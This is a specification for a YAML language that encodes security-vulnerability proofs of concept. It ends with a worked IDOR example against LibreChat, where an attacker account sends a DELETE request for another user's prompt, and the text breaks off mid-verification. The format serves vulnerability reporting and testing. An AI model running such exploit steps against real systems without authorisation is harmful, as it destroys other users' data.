PoC DSL Specification v1.0

**Table of Contents**

1.  [Introduction]
      * [1.1 Purpose]
      * [1.2 Core Concepts]
      * [1.3 Format]
      * [1.4 Version]
2.  [Overall Structure]
3.  [Top-Level `poc` Object]
4.  [`metadata` Object]
5.  [`context` Object]
      * [5.1 `context.users`]
      * [5.2 `context.resources`]
      * [5.3 `context.environment`]
      * [5.4 `context.files`]
      * [5.5 `context.variables`]
6.  [`setup` List (GIVEN - Global)]
7.  [`exploit_scenario` Object (WHEN)]
      * [7.1 `exploit_scenario.setup` (Optional Scenario Setup)]
      * [7.2 `exploit_scenario.steps` (Exploit Actions)]
      * [7.3 `exploit_scenario.teardown` (Optional Scenario Teardown)]
8.  [`assertions` List (THEN - Immediate)]
9.  [`verification` List (Optional - Impact Confirmation)]
10. [Common Structures]
      * [10.1 Step Object]
      * [10.2 Action Object]
      * [10.3 Check Object]
      * [10.4 HTTP Request Object (`action.request`)]
      * [10.5 HTTP Response Action Object (`action.response_actions`)]
11. [Variable Substitution Syntax]
      * [11.1 Basic Syntax]
      * [11.2 Function Syntax]
      * [11.3 Defined Functions]
12. [Defined Action Types]
13. [Defined Check Types]
14. [Protocol Expansion Strategy]
15. [Best Practices]
16. [Complete Example (LibreChat IDOR PoC)]

-----

## 1. Introduction

### 1.1 Purpose

This document specifies the structure and syntax for the Proof-of-Concept (PoC) Domain Specific Language (DSL), Version 1.0. The DSL aims to represent security vulnerability PoCs in a format that is:

  * Human-Readable: Utilizes BDD (Given-When-Then) style natural language descriptions (`dsl` field) for clarity and collaboration among developers, security analysts, and testers.
  * Machine-Parsable: Employs a structured format (YAML) with precise data fields for automation (execution, validation), analysis, and integration into security tools and platforms.
  * Comprehensive: Captures essential metadata, complex preconditions (setup), multi-step exploit actions, expected outcomes (assertions), and impact verification steps.
  * Flexible: Supports control flow (conditionals, loops), dynamic data generation and transformation, multiple protocols (via extension), and asynchronous operations.

### 1.2 Core Concepts

  * BDD Narrative: Uses `dsl` fields within steps (`setup`, `exploit_scenario`, `assertions`, `verification`) to provide a natural language description corresponding to the Given-When-Then flow.
  * Structured Data: Embeds detailed, unambiguous technical information within `action`, `request`, `check`, and `context` objects for precise execution.
  * Context Management: Defines and utilizes variables (`context` object, `{{...}}` syntax) to manage dynamic data like target details, temporary IDs, extracted values, and placeholders for credentials.
  * Modularity: Separates concerns into distinct phases (Setup, Exploit, Assertions, Verification) and allows for scenario-specific setup/teardown.

### 1.3 Format

The primary representation format is YAML due to its readability features like comments and anchors.

### 1.4 Version

This document specifies **Version 1.0** of the PoC DSL. PoC files conforming to this specification MUST include `dsl_version: "1.0"` in their `metadata`.

-----

## 2. Overall Structure

A PoC definition is contained within a single top-level `poc` object.

```yaml
poc:
  metadata: { ... }         # See Section 4
  context: { ... }          # See Section 5
  setup: [ ... ]            # See Section 6 (Global Setup)
  exploit_scenario: { ... } # See Section 7
  assertions: [ ... ]       # See Section 8 (Immediate Assertions)
  verification: [ ... ]     # See Section 9 (Optional Impact Verification)
```

-----

## 3. Top-Level `poc` Object

  * Type: `Object`
  * Description: The root object containing the entire PoC definition.
  * Fields:
      * `metadata` (`Object`, Required): Contains descriptive information about the PoC. See Section 4.
      * `context` (`Object`, Required): Defines the necessary environment, actors, resources, files, and variables. See Section 5.
      * `setup` (`List[Step Object]`, Optional): Global setup steps executed once before the exploit scenario. See Section 6.
      * `exploit_scenario` (`Object`, Required): Defines the core exploit steps and scenario-specific setup/teardown. See Section 7.
      * `assertions` (`List[Step Object]`, Required): Immediate checks performed after the exploit steps. See Section 8.
      * `verification` (`List[Step Object]`, Optional): Additional steps to confirm the vulnerability's impact. See Section 9.

-----

## 4. `metadata` Object

  * Type: `Object`
  * Description: Contains descriptive information about the PoC and the vulnerability.
  * Fields:
      * `id` (`String`, Required): A unique identifier for this PoC definition (e.g., `AppName-VulnType-Date`, `CVE-XXXX-YYYYY-Variant`). Must be machine-friendly.
      * `title` (`String`, Required): A concise, human-readable title for the PoC.
      * `dsl_version` (`String`, Required): The version of this DSL specification the PoC adheres to (Must be `"1.0"`).
      * `source_report` (`Object`, Optional): Information linking to the original vulnerability report or discovery context.
          * `platform` (`String`, Optional): Platform of report (e.g., `HackerOne`, `Bugcrowd`, `GitHub`, `Internal`, `Public Blog`).
          * `id` (`String`, Optional): The report identifier (ID, Issue Number, URL) on the platform.
          * `reported_date` (`String`, Optional): The date the vulnerability was reported (Format: `YYYY-MM-DD`).
      * `vulnerability` (`Object`, Optional): Details about the vulnerability.
          * `type` (`String`, Optional): Primary vulnerability type (e.g., `Improper Access Control`, `IDOR`, `Path Traversal`, `RCE`, `SQL Injection`, `XSS`).
          * `cwe` (`String` or `Integer`, Optional): Relevant Common Weakness Enumeration ID (e.g., `CWE-22`, `CWE-284`).
      * `target_application` (`Object`, Optional): Details about the affected application/system.
          * `name` (`String`, Optional): Name of the application, library, or component.
          * `version` (`String`, Optional): Specific version(s) affected, if known (can be a range or list).
      * `severity` (`String`, Optional): Assessed severity. Recommended values: `Enum[Info, Low, Medium, High, Critical]`.
      * `tags` (`List[String]`, Optional): Relevant keywords for categorization, filtering, and searching (e.g., `api`, `authenticated`, `file_upload`, `linux`).

-----

## 5. `context` Object

  * Type: `Object`
  * Description: Defines the necessary environment, actors (users), objects (resources), files, and variables required to execute the PoC. Values defined here are accessible throughout the PoC using the [Variable Substitution Syntax](https://www.google.com/search?q=%2311-variable-substitution-syntax). **Sensitive data like passwords or API keys must never be stored directly here.** Use placeholders and external secure mechanisms for injection/resolution.
  * Fields:
      * `description` (`String`, Optional): A brief text description of the required context or prerequisites.
      * `users` (`List[Object]`, Optional): Defines user roles or specific user contexts needed. See [5.1 `context.users`](https://www.google.com/search?q=%2351-contextusers).
      * `resources` (`List[Object]`, Optional): Defines data objects or resources relevant to the PoC. See [5.2 `context.resources`](https://www.google.com/search?q=%2352-contextresources).
      * `environment` (`List[Object]`, Optional): Defines target environment details. See [5.3 `context.environment`](https://www.google.com/search?q=%2353-contextenvironment).
      * `files` (`List[Object]`, Optional): Defines files needed for the PoC. See [5.4 `context.files`](https://www.google.com/search?q=%2354-contextfiles).
      * `variables` (`List[Object]`, Optional): Defines placeholders for dynamic values. See [5.5 `context.variables`](https://www.google.com/search?q=%2355-contextvariables).

### 5.1 `context.users`

  * Type: `List[Object]`
  * Description: List of user contexts required (e.g., attacker, victim, admin).
  * Object Fields:
      * `id` (`String`, Required): Unique identifier within the context (e.g., `victim_user`, `attacker_user`). Used for referencing in `authentication_context`.
      * `description` (`String`, Optional): Description of the user's role or purpose.
      * `credentials_ref` (`String`, Optional): An abstract reference/handle (e.g., `attacker_creds_set1`). The execution engine resolves this externally to obtain actual credentials (tokens, passwords, cookies).
      * `credentials` (`Object`, Optional): *Alternative* for defining nested placeholder variables specific to this user (e.g., `bearer_token: "{{ placeholder_for_attacker_token }}"`). Requires external resolution.

### 5.2 `context.resources`

  * Type: `List[Object]`
  * Description: List of resources involved (e.g., a file to delete, a record to access).
  * Object Fields:
      * `id` (`String`, Required): Unique identifier (e.g., `victim_prompt`, `target_config_file`).
      * `description` (`String`, Optional): Description.
      * `identifier` (`Any`, Optional): Specific value (e.g., a database ID `"12345"`, a file path `"/etc/passwd"`). Can be set during `setup`.
      * `type` (`String`, Optional): Type hint (e.g., `prompt`, `file`, `database_record`, `user_account`).

### 5.3 `context.environment`

  * Type: `List[Object]`
  * Description: List of environment settings, primarily target details.
  * Object Fields:
      * `id` (`String`, Required): Unique identifier (e.g., `target_host`, `target_port`, `target_base_url`).
      * `value` (`Any`, Required): Value. Can use variable substitution (e.g., defining `target_base_url` using `target_host` and `target_port`).

### 5.4 `context.files`

  * Type: `List[Object]`
  * Description: List of files needed, often for uploads or local crafting.
  * Object Fields:
      * `id` (`String`, Required): Unique identifier (e.g., `crafted_rar`, `payload_script`).
      * `description` (`String`, Optional): Description.
      * `local_path` (`String`, Required): Path on the *local machine* running the PoC tool/authoring environment. This file might be created during `setup`.

### 5.5 `context.variables`

  * Type: `List[Object]`
  * Description: List of variables for storing dynamic data captured or generated during execution.
  * Object Fields:
      * `id` (`String`, Required): Unique identifier (e.g., `session_token`, `server_tmp_path`, `csrf_token`, `generated_item_id`).
      * `value` (`Any`, Optional): Initial or default value (often `null`). Values are typically populated via `action.response_actions` or `action.type: generate_data`.

-----

## 6. `setup` List (GIVEN - Global)

  * Type: `List[Step Object]`
  * Description: Represents the global `GIVEN` phase. Defines a sequence of steps executed once to establish the necessary preconditions *before* the `exploit_scenario` begins. If any step fails, execution typically halts.
  * Details: Each item in the list is a [Step Object](https://www.google.com/search?q=%23101-step-object). Actions often include environment checks, resource creation (`ensure_resource_exists`), user setup (`ensure_users_exist`), local file preparation (`execute_local_commands`), or initial authentication (`authenticate`).

-----

## 7. `exploit_scenario` Object (WHEN)

  * Type: `Object`
  * Description: Represents the core `WHEN` phase, potentially including scenario-specific setup and teardown.
  * Fields:
      * `name` (`String`, Optional): A descriptive name for this specific exploit scenario (useful if a PoC contains multiple scenarios in the future, though v1.0 focuses on one).
      * `setup` (`List[Step Object]`, Optional): Scenario-specific setup steps. See [7.1 `exploit_scenario.setup`].
      * `steps` (`List[Step Object]`, Required): The main sequence of exploit actions. See [7.2 `exploit_scenario.steps`].
      * `teardown` (`List[Step Object]`, Optional): Scenario-specific cleanup steps. See [7.3 `exploit_scenario.teardown`].

### 7.1 `exploit_scenario.setup` (Optional Scenario Setup)

  * Type: `List[Step Object]`
  * Description: Scenario-specific `GIVEN` steps executed immediately before `exploit_scenario.steps`. Useful for setup specific to this exploit attempt that shouldn't be in the global `setup`.

### 7.2 `exploit_scenario.steps` (Exploit Actions)

  * Type: `List[Step Object]`
  * Description: The sequence of core exploit actions. Each item is a [Step Object](https://www.google.com/search?q=%23101-step-object). These steps often involve sending malicious requests (`http_request`), triggering vulnerable functionality, and potentially capturing intermediate results using `response_actions`. Control flow features like `if` and `loop` can be used here.

### 7.3 `exploit_scenario.teardown` (Optional Scenario Teardown)

  * Type: `List[Step Object]`
  * Description: Cleanup steps executed immediately after `exploit_scenario.steps` finish (intended to run even if assertions fail, but potentially skipped if execution halts due to critical action failure). Useful for deleting temporary resources created during the exploit steps.

-----

## 8. `assertions` List (THEN - Immediate)

  * Type: `List[Step Object]`
  * Description: Represents the immediate `THEN` phase. Defines checks performed directly after the `exploit_scenario.steps` to validate if the exploit action produced the expected *immediate* outcome (e.g., correct HTTP status, specific data in response body, expected error message).
  * Details: Each item is a [Step Object], typically containing a `check` field. Polling (`retry_interval`, `max_attempts`) can be used for checks that might not succeed instantly. `expected_error` can be used to assert specific failure conditions.

-----

## 9. `verification` List (Optional - Impact Confirmation)

  * Type: `List[Step Object]`
  * Description: Optional phase for performing deeper checks to confirm the *actual impact* or side-effects of the vulnerability, going beyond the immediate response asserted in the `assertions` phase.
  * Details: Each item is a [Step Object]. Steps often involve `action`s (e.g., attempting to access a resource as a different user, triggering a command execution check) followed by `check`s (e.g., verifying file existence/content on server, checking database state, confirming elevated privileges).

-----

## 10. Common Structures

### 10.1 Step Object

  * Used In: `setup`, `exploit_scenario.setup`, `exploit_scenario.steps`, `exploit_scenario.teardown`, `assertions`, `verification`
  * Type: `Object`
  * Description: Represents a single step within a phase of the PoC.
  * Fields:
      * `step` (`Integer` or `String`, Optional): A sequence number or unique identifier for the step within its list, primarily for human readability and referencing.
      * `dsl` (`String`, Required): The human-readable, BDD-style description of the step's purpose or the action/check being performed.
      * `if` (`String`, Optional): A condition string (using [Variable Substitution] resolving to a boolean `true` or `false`). The step only executes if the condition evaluates to true. If omitted, the step always executes (unless skipped by a prior failure). Example: `"{{ context.variables.user_role.value == 'admin' }}"`.
      * `loop` (`Object`, Optional): Defines looping behavior for this step. If present, the step's `action` or `check` (or nested `steps`) executes multiple times.
          * `over` (`String`, Required): Context variable path resolving to a List (e.g., `"{{ context.resources.target_ids }}"`).
          * `variable_name` (`String`, Required): Name assigned to the current item from the list in each iteration. Accessible within the loop via `context.loop.<variable_name>` (e.g., `{{ context.loop.current_id }}`).
          * `steps` (`List[Step Object]`, Optional): If the loop needs to execute multiple *different* steps per iteration, define them here. If omitted, the primary `action` or `check` of the current Step Object is executed for each item in the `over` list.
      * `manual` (`Boolean`, Optional): If `true`, the execution engine should pause before executing this step, display the `dsl` and potentially the `action`/`check` details, and require user confirmation to proceed or indicate manual completion. Defaults to `false`.
      * `action` (`Action Object`, Optional): Defines the action to be performed. Usually present in `setup` and `exploit_scenario`. See [10.2 Action Object].
      * `check` (`Check Object`, Optional): Defines the check/assertion to be performed. Usually present in `assertions` and `verification`. See [10.3 Check Object].
      * *Note: A step typically contains either `action` or `check`, but usually not both directly (unless an action implicitly includes verification).*

### 10.2 Action Object

  * Used In: `Step Object`
  * Type: `Object`
  * Description: Defines an operation to be performed.
  * Fields:
      * `type` (`String`, Required): The type of action. See [Defined Action Types].
      * `description` (`String`, Optional): A detailed technical description, supplementing the `dsl`.
      * `authentication_context` (`String`, Optional): The `id` of the user context (from `context.users`) whose credentials/session should be used. `null` or omitted implies unauthenticated or a default engine context.
      * `timeout` (`String`, Optional): Action-specific timeout override (e.g., `"10s"`, `"1m"`).
      * `retries` (`Integer`, Optional): Number of retries on *transient* failures (e.g., network timeout, 503). Defaults to 0. Does not retry on definitive failures like 4xx errors unless specifically configured by the engine.
      * `retry_delay` (`String`, Optional): Delay between retries (e.g., `"500ms"`, `"2s"`).
      * `request` (`HTTP Request Object`, Optional): Required if `type` is `http_request`. See [10.4 HTTP Request Object].
      * `commands` (`List[String]`, Optional): Required if `type` is `execute_local_commands`.
      * `users` (`List[String]`, Optional): Required if `type` is `ensure_users_exist`. List of user `id`s.
      * `resource` (`String`, Optional): Required if `type` is `ensure_resource_exists`. The resource `id`.
      * `user_context` (`String`, Optional): User `id` performing the setup action (e.g., for `ensure_resource_exists`).
      * `generator` (`String`, Optional): Required if `type` is `generate_data`. The type of data generator (e.g., `random_string`, `uuid`, `current_timestamp`).
      * `parameters` (`Object`, Optional): Parameters for the specific action `type` (e.g., for `generate_data`: `{ length: 10, charset: "alphanumeric" }`; for `authenticate`: `{ token_url: "...", client_id: "..." }`). Structure depends on `type`.
      * `target_variable` (`String`, Optional): The context variable `id` (e.g., `context.variables.my_var`) where the primary output of the action (e.g., generated data, created resource ID) should be stored. *Distinct from `response_actions` which are specifically for HTTP responses.*
      * `response_actions` (`List[HTTP Response Action Object]`, Optional): List of actions (primarily extractions) to perform on the HTTP response if `type` is `http_request`. See [10.5 HTTP Response Action Object].
      * `duration` (`String`, Optional): Required if `type` is `wait`. Duration string (e.g., `"5s"`, `"500ms"`).
      * `auth_type` (`String`, Optional): Required if `type` is `authenticate`. Specifies the auth method (e.g., `form`, `oauth2_client_credentials`).
      * *... other fields specific to the action `type` ...*

### 10.3 Check Object

  * Used In: `Step Object`
  * Type: `Object`
  * Description: Defines a condition or state to be verified.
  * Fields:
      * `type` (`String`, Required): The type of check. See [Defined Check Types].
      * `description` (`String`, Optional): Detailed technical description.
      * `retry_interval` (`String`, Optional): Interval for polling checks (e.g., `"1s"`). Requires `max_attempts` \> 1.
      * `max_attempts` (`Integer`, Optional): Maximum check attempts for polling. Defaults to 1.
      * `expected_status` (`Integer`, Optional): Required for `http_response_status`.
      * `contains` (`String`, Optional): For `http_response_body`, `http_response_header`, `check_remote_resource`. Checks if substring exists.
      * `equals` (`Any`, Optional): For `http_response_header`, `check_remote_resource`. Checks for exact equality.
      * `equals_json` (`String` or `Object`, Optional): For `http_response_body`. Checks for exact JSON structural equality.
      * `json_path` (`Object`, Optional): For `http_response_body`. Checks value at JSONPath.
          * `path` (`String`, Required): JSONPath expression (e.g., `$.user.id`).
          * `value` (`Any`, Optional): Expected value at the path. If omitted, checks for path existence.
          * `value_matches` (`String`, Optional): Regex pattern to match the value at the path.
      * `regex` (`String`, Optional): For `http_response_body`, `http_response_header`, `check_remote_resource`. Checks if content matches regex.
      * `header_name` (`String`, Optional): For `http_response_header`. Name of the header.
      * `resource_type` (`Enum[file, directory]`, Optional): For `check_remote_resource`.
      * `path` (`String`, Optional): For `check_remote_resource`. Path on target system.
      * `state` (`Enum[exists, not_exists]`, Optional): For `check_remote_resource`. Existence check.
      * `content_contains` (`String`, Optional): For `check_remote_resource` (file type).
      * `content_equals` (`String`, Optional): For `check_remote_resource` (file type).
      * `expected_error` (`Object`, Optional): Asserts that the preceding action *should* have resulted in a specific error condition. Cannot be combined with positive assertions like `expected_status: 200`.
          * `status_matches` (`String` or `Integer`, Optional): HTTP status code or regex for non-success codes (e.g., `404`, `"5.."`).
          * `message_contains` (`String`, Optional): Substring expected in error output/response body.
          * `error_type_matches` (`String`, Optional): Regex for specific internal error types if exposed (e.g., `TimeoutError`, `.*ValidationException`).
      * *... other fields specific to the check `type` ...*

### 10.4 HTTP Request Object (`action.request`)

  * Used In: `Action Object` (when `type` is `http_request`)
  * Type: `Object`
  * Description: Defines the details of an HTTP request.
  * Fields:
      * `method` (`String`, Required): HTTP method (`GET`, `POST`, `PUT`, `DELETE`, `PATCH`, `OPTIONS`, `HEAD`).
      * `url` (`String`, Required): Full request URL, supporting [Variable Substitution].
      * `headers` (`Object`, Optional): Key-value pairs (both `String`) of HTTP request headers.
      * `body_type` (`Enum[raw, json, form, multipart]`, Optional): Specifies how the `body` field should be interpreted or if `multipart` is used. Defaults to `raw` if `body` is a string, `json` if `body` is an object/map, `form` if specified.
      * `body` (`Any`, Optional): Request body. Structure depends on `body_type`:
          * `raw`: `String`.
          * `json`: `Object` (YAML map/dictionary). Will be JSON serialized.
          * `form`: `Object` (YAML map/dictionary of key-value pairs). Will be URL-encoded form data.
          * Ignored if `multipart` is used.
      * `multipart` (`Object`, Optional): Defines multipart/form-data request structure. Used for file uploads. Cannot be used with `body`.
          * `files` (`List[Object]`, Optional): Files to upload.
              * `parameter_name` (`String`, Required): Form field name for the file.
              * `filename` (`String`, Required): Filename sent to the server.
              * `local_path` (`String`, Required): Path to the source file (from `context.files.local_path`).
              * `content_type` (`String`, Optional): File MIME type (e.g., `image/jpeg`, `application/octet-stream`).
          * `data` (`Object`, Optional): Key-value pairs (`String`: `String`) for other non-file form fields.
      * `redirects` (`Boolean`, Optional): Hint for execution engine whether to follow redirects. Engine policy may override. Default: `true`.
      * `max_redirects` (`Integer`, Optional): Hint for maximum redirects to follow. Engine policy may override. Default: (engine specific, e.g., 10).

### 10.5 HTTP Response Action Object (`action.response_actions`)

  * Used In: `Action Object` (within `response_actions` list)
  * Type: `Object`
  * Description: Defines actions (primarily extractions) performed on an HTTP response. Executes after the request completes but before subsequent steps.
  * Fields:
      * `type` (`String`, Required): `Enum[extract_from_json, extract_from_header, extract_from_body_regex, extract_from_html, extract_from_xml]`
      * `description` (`String`, Optional): Description of what is being extracted.
      * `source` (`Enum[body, header]`, Optional, Default: `body`): Location to extract from.
      * `target_variable` (`String`, Required): Context variable `id` (e.g., `context.variables.my_var`) to store the extracted value(s). If multiple values are found, they are stored as a list.
      * `json_path` (`String`, Optional): Required for `extract_from_json`. JSONPath expression.
      * `header_name` (`String`, Optional): Required for `extract_from_header`. Name of the header (case-insensitive).
      * `regex` (`String`, Optional): Required for `extract_from_body_regex`. Regex pattern.
      * `group` (`Integer`, Optional): Regex capture group index for `extract_from_body_regex`. Defaults to 1 (first group). Use 0 for the full match.
      * `css_selector` (`String`, Optional): Required for `extract_from_html`. CSS Selector expression.
      * `xpath` (`String`, Optional): Required for `extract_from_xml`, optional for `extract_from_html`. XPath expression.
      * `attribute` (`String`, Optional): For HTML/XML extraction, specifies the attribute to extract from the selected element(s) (e.g., `href`, `src`, `value`). If omitted, extracts the text content.
      * `extract_all` (`Boolean`, Optional): If `true`, stores all found matches as a list in the `target_variable`. If `false` or omitted, stores only the first match. Defaults to `false`.

-----

## 11. Variable Substitution Syntax

### 11.1 Basic Syntax

  * Format: `{{ path.to.variable }}`
  * Purpose: Reference values stored within the `context` object.
  * Resolution: The path mirrors the YAML structure starting from `context`.
      * `{{ context.environment.target_base_url.value }}`
      * `{{ context.users.attacker_user.credentials_ref }}`
      * `{{ context.variables.session_token.value }}`
      * `{{ context.resources.victim_prompt.identifier }}`
      * Within loops: `{{ context.loop.current_id }}` (where `current_id` is the `variable_name` defined in the `loop` object).

### 11.2 Function Syntax

  * Format: `{{ func_name( argument1 [, argument2]... ) }}`
  * Purpose: Apply built-in transformation functions to values (often retrieved via basic variable substitution).
  * Arguments: Can be literals (strings, numbers) or nested variable substitutions. Example: `{{ base64_encode( context.variables.payload.value ) }}`

### 11.3 Defined Functions

  * `base64_encode(string)`: Base64 encodes the input string.
  * `base64_decode(string)`: Base64 decodes the input string.
  * `url_encode(string)`: URL-encodes the input string (standard component encoding).
  * `url_decode(string)`: URL-decodes the input string.
  * `json_escape(string)`: Escapes characters necessary for embedding the string within a JSON string value.
  * `html_escape(string)`: Escapes HTML special characters (e.g., `<`, `>`, `&`).
  * *(Note: Execution engines may support additional functions. This list represents a recommended baseline.)*

-----

## 12. Defined Action Types

This list defines standard action types. Execution engines MAY support additional custom types.

  * Setup & Control:
      * `ensure_users_exist`: (Setup) Ensures specified users are available (engine specific: might check, create, or require manual setup). Params: `users` (`List[String]`).
      * `ensure_resource_exists`: (Setup) Ensures a resource exists (engine specific: check, create via API, etc.). Params: `user_context`, `resource`, `output_variable` (optional, stores created ID).
      * `execute_local_commands`: (Setup) Executes shell commands on the PoC runner machine. **SECURITY RISK: Use with extreme caution.** Params: `commands` (`List[String]`).
      * `check_target_availability`: (Setup) Basic check if target is reachable (e.g., TCP ping, basic HTTP GET). Params: `url` or `host`/`port`.
      * `manual_action` / `manual_step`: (Any phase) Pauses execution, requires manual intervention described in `dsl`/`description`. `manual: true` flag on any step object achieves similar pausing.
      * `generate_data`: Generates dynamic data. Params: `generator` (`Enum[random_string, random_int, uuid, current_timestamp]`), `parameters` (generator-specific, e.g., `{length: 10, charset: "hex"}`), `target_variable`.
      * `authenticate`: Performs authentication. Params: `auth_type` (`Enum[form, oauth2_client_credentials, ...]`), `parameters` (type-specific), `output_variable` or implicit context update.
      * `wait`: Pauses execution. Params: `duration` (`String`, e.g., `"5s"`).
  * **Interaction:**
      * `http_request`: Sends an HTTP request. Params: `request`, `authentication_context`, `response_actions`.
  * *(Protocol Expansion Point: Define types like `websocket_send`, `dns_query`, `tcp_send`, `sql_query` with their specific parameters here)*

-----

## 13. Defined Check Types

This list defines standard check types.

  * **HTTP Specific:**
      * `http_response_status`: Checks HTTP status code. Params: `expected_status` (`Integer`).
      * `http_response_body`: Checks response body content. Params: One of `contains`, `equals`, `equals_json`, `json_path`, `regex`.
      * `http_response_header`: Checks response headers. Params: `header_name`, one of `contains`, `equals`, `regex`, or check for presence only.
  * **Remote State:**
      * `check_remote_resource`: Checks file/directory on target. Params: `resource_type` (`Enum[file, directory]`), `path`, one or more of `state` (`Enum[exists, not_exists]`), `content_contains`, `content_equals`, `regex`. **Requires specific execution capabilities.**
  * **Manual:**
      * `manual_check`: Indicates a check requiring manual verification described in `dsl`/`description`.
  * *(Protocol Expansion Point: Define types like `check_dns_record`, `check_tcp_port_open` here)*
  * **Common Parameters:** All checks support optional `retry_interval`, `max_attempts`, and `expected_error`.

-----

## 14. Protocol Expansion Strategy

While this specification details HTTP extensively, it is designed to be extensible for other protocols:

1.  **Define Action Types:** Introduce new `action.type` values for protocol-specific actions (e.g., `dns_query`, `websocket_send`, `sql_query`).
2.  **Define Action Parameters:** Specify the necessary parameters within the `action` object for each new type (e.g., `dns_query` needs `server`, `query_name`, `query_type`; `sql_query` needs `connection_ref`, `query`).
3.  **Define Check Types:** Introduce new `check.type` values for protocol-specific assertions (e.g., `check_dns_record`, `check_sql_result`).
4.  **Define Check Parameters:** Specify the necessary parameters for each new check type (e.g., `check_dns_record` needs `expected_value`, `record_type`).
5.  **Document Extensions:** Clearly document these new types and parameters as extensions or appendices to this core v1.0 specification. Execution engines would implement support for these extensions as needed.

-----

## 15. Best Practices

  * **Clear DSL:** Ensure `dsl` descriptions accurately reflect the technical `action` or `check`.
  * **Atomic Steps:** Favor smaller, focused steps over single large, complex steps.
  * **Context Management:** Define all prerequisites and dynamic data clearly in `context`. Use meaningful `id`s.
  * **Credential Security:** **NEVER** embed secrets. Use `credentials_ref` or placeholders resolved securely by the execution engine.
  * **Minimalism:** Include only necessary parameters, headers, and data for clarity and reduced brittleness.
  * **Verification:** Always include `verification` steps if possible to confirm the *actual* impact.
  * **Idempotency:** Aim for idempotent `setup` and `teardown` steps where feasible.
  * **Control Flow:** Use `if` for simple conditional logic. Use `loop` for iteration. Avoid overly complex nested logic if possible.
  * **Error Handling:** Use `expected_error` to assert expected failure conditions correctly. Use `retries` only for likely transient issues.
  * **Use Versioning:** Always include `dsl_version: "1.0"` in `metadata`.

-----

## 16. Complete Example (LibreChat IDOR PoC)

This example demonstrates the PoC for the "Improper Access Control Allows deleting other users' reminders in danny-avila/librechat" vulnerability using DSL v1.0.

```yaml
poc:
  metadata:
    id: LibreChat-IDOR-DeletePrompt-Nov2024-v1.0
    title: Improper Access Control Allows deleting other users' prompts (LibreChat)
    dsl_version: "1.0" # Specify DSL version
    source_report:
      platform: Internal / Public Disclosure # Specify source if known
      reported_date: 2024-11-12 # Adjust year as needed based on current date: 2025-04-24 -> Use 2024 from report
    vulnerability:
      type: Improper Access Control (IDOR)
      cwe: CWE-284 # Improper Access Control
    target_application:
      name: danny-avila/librechat
    severity: High
    tags: [IDOR, Access Control, Delete, Prompt, API, LibreChat]

  context:
    description: Requires two active user accounts (Victim, Attacker) and a prompt created by the Victim. Assumes valid authentication tokens/cookies can be obtained.
    users:
      - id: victim_user
        description: "User A, owner of the prompt to be deleted."
        credentials_ref: "victim_user_credentials" # Handle to external credential store
      - id: attacker_user
        description: "User B, attempting the unauthorized deletion."
        credentials_ref: "attacker_user_credentials" # Handle to external credential store
    resources:
      - id: victim_prompt
        description: "The prompt created by the victim user that the attacker will target."
        # Identifier hardcoded from the original report example. Could be set dynamically in setup.
        identifier: "6721b4a6d634c1a37a25bf0e"
        type: prompt
    environment:
      - id: target_host
        value: "localhost.com:3080" # From report example
      - id: target_scheme
        value: "http" # Assuming HTTP based on report URLs
      - id: target_base_url
        # Use variable substitution to build the base URL
        value: "{{ context.environment.target_scheme.value }}://{{ context.environment.target_host.value }}"

  # Global setup phase
  setup:
    - step: 1
      dsl: "Given the target LibreChat instance is running and accessible"
      action:
        type: check_target_availability
        url: "{{ context.environment.target_base_url.value }}"
        timeout: "5s" # Example of optional execution hint

    # In a real automated scenario, these steps would use API calls or UI automation.
    # For this example, we assume they are pre-existing based on report steps.
    - step: 2
      dsl: "And user 'victim_user' exists and is authenticated"
      action:
        type: manual_action # Or 'authenticate' action if login flow is defined
        description: "Ensure victim user exists and valid credentials (e.g., Cookie, Bearer) are available via 'victim_user_credentials' reference."

    - step: 3
      dsl: "And user 'attacker_user' exists and is authenticated"
      action:
        type: manual_action # Or 'authenticate' action
        description: "Ensure attacker user exists and valid credentials (e.g., Cookie, Bearer) are available via 'attacker_user_credentials' reference."

    - step: 4
      dsl: "And prompt 'victim_prompt' with ID '{{ context.resources.victim_prompt.identifier }}' exists and belongs to 'victim_user'"
      action:
        # This could be an API call to create the prompt if needed, or just assumed true.
        type: ensure_resource_exists # Or manual_check
        resource: "victim_prompt"
        user_context: "victim_user" # Action performed as victim
        description: "Verify prompt exists via API or assume based on report steps."

  # Exploit phase
  exploit_scenario:
    name: Attacker (User B) deletes Victim's (User A) prompt via IDOR
    # No scenario-specific setup/teardown needed for this example
    steps:
      - step: 1
        dsl: "When 'attacker_user' sends a DELETE request to delete 'victim_prompt'"
        action:
          type: http_request
          # Use the attacker's context for authentication
          authentication_context: "attacker_user"
          request:
            method: DELETE
            # Construct URL using context variables
            url: "{{ context.environment.target_base_url.value }}/api/prompts/groups/{{ context.resources.victim_prompt.identifier }}"
            headers:
              # Headers copied from the report, using placeholders for auth tokens
              # Assumes credential resolver provides .cookie and .bearer_token fields
              Host: "{{ context.environment.target_host.value }}"
              Cookie: "refreshToken={{ context.users.attacker_user.credentials.cookie }}" # Placeholder resolved externally
              Sec-Ch-Ua: "\"Not;A=Brand\";v=\"24\", \"Chromium\";v=\"128\""
              Accept: "application/json, text/plain, */*"
              Accept-Language: "en-US,en;q=0.9"
              Sec-Ch-Ua-Mobile: "?0"
              Authorization: "Bearer {{ context.users.attacker_user.credentials.bearer_token }}" # Placeholder resolved externally
              User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36"
              Sec-Ch-Ua-Platform: "\"Windows\""
              Origin: "{{ context.environment.target_base_url.value }}"
              Sec-Fetch-Site: "same-origin"
              Sec-Fetch-Mode: "cors"
              Sec-Fetch-Dest: "empty"
              Referer: "{{ context.environment.target_base_url.value }}/d/prompts/some_referer_id" # Referer from example
              Accept-Encoding: "gzip, deflate, br"
              Priority: "u=1, i"
            body: null # No body expected for this DELETE

  # Immediate assertions after the exploit request
  assertions:
    - step: 1
      dsl: "Then the server should respond with HTTP status 200 OK indicating the delete operation was accepted"
      check:
        type: http_response_status
        expected_status: 200

    - step: 2
      dsl: "And the response body should contain the success message"
      check:
        type: http_response_body
        # Using json_path to be more specific than just 'contains'
        json_path:
          path: "$.promptGroup"
          value: "Prompt group deleted successfully"
        # Alternative check:
        # equals_json: '{"promptGroup":"Prompt group deleted successfully"}'

  # Optional verification steps to confirm impact
  verification:
    - step: 1
      dsl: "And when 'victim_user' tries to access their prompt 'victim_prompt'"
      action:
        type: http_request
        # Use the victim's context now
        authentication_context: "victim_user"
        request:
          method: GET
          # Attempt to retrieve the supposedly deleted prompt
